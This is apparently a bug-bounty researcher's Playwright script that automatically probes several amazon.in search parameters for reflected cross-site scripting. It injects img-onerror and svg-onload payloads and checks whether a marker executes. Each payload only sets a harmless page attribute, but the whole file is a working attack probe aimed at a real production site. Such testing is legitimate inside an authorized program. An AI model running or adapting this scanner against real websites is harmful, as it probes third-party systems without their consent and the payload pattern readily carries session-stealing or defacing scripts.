import { chromium } from "playwright";

const ua = "amazonvrpresearcher_pradyuman1";
const payloads = [
  `"><img src=x onerror="document.body.dataset.h1xss='EXECUTED'">`,
  `"><svg/onload="document.body.dataset.h1xss='EXECUTED'">`,
  `</title><svg/onload="document.body.dataset.h1xss='EXECUTED'">`
];

const targets = [
  "https://www.amazon.in/s?k={P}",
  "https://www.amazon.in/s?field-keywords={P}",
  "https://www.amazon.in/s?rh=p_89%3A{P}&k={P}",
  "https://www.amazon.in/s?i=aps&k={P}",
  "https://www.amazon.in/s?ref={P}&k=notebook"
];

const browser = await chromium.launch({ headless: true });
let finding = false;

for (const raw of targets) {
  for (const payload of payloads) {
    const url = raw.replace("{P}", encodeURIComponent(payload));
    const page = await browser.newPage({
      userAgent: ua,
      extraHTTPHeaders: { "Accept-Language": "en-IN,en;q=0.9" }
    });

    try {
      const resp = await page.goto(url, {
        waitUntil: "domcontentloaded",
        timeout: 30000
      });
      const status = resp?.status() ?? null;
      await page.waitForTimeout(1200);

      const executed = await page.evaluate(
        () => document.body?.dataset?.h1xss === "EXECUTED"
      );
      const html = await page.content();

      console.log("TEST", url);
      console.log(
        "STATUS",
        status,
        "EXECUTED",
        executed,
        "MARKER_IN_DOM",
        html.includes("EXECUTED"),
        "FINAL_URL",
        page.url()
      );

      if (executed) {
        finding = true;
        console.log("VERIFIED_FINDING reflected_xss", url);
        break;
      }
    } catch (error) {
      console.log("ERROR", url, String(error));
    } finally {
      await page.close();
    }

    await new Promise(resolve => setTimeout(resolve, 2200));
  }

  if (finding) break;
}

await browser.close();

if (!finding) {
  console.log("NO_VERIFIED_REFLECTED_XSS");
}

if (finding) {
  process.exit(42);
}
